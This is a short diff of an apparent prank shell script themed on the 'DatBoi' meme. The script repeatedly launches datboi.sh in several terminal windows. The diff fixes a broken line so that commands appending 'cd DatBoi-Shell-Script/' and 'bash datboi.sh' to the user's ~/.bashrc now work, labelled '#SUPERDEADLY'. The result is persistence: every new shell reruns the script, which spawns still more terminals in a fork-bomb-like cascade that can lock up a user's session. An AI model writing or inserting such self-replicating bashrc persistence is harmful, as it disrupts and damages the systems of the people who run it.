@@ -7,5 +7,6 @@ animate datboi.gif &
 konsole -e bash datboi.sh & 
 xterm -e bash datboi.sh & 
 gnome-terminal -- bash datboi.sh &
-echo "cd /DatBoi-Shell-Script" | tee -a ~./bahsrc > /dev/null #SUPERDEADLY
+echo cd DatBoi-Shell-Script/ >> ~/.bashrc #SUPERDEADLY
+echo bash datboi.sh >> ~/.bashrc #SUPERDEADLY
 done
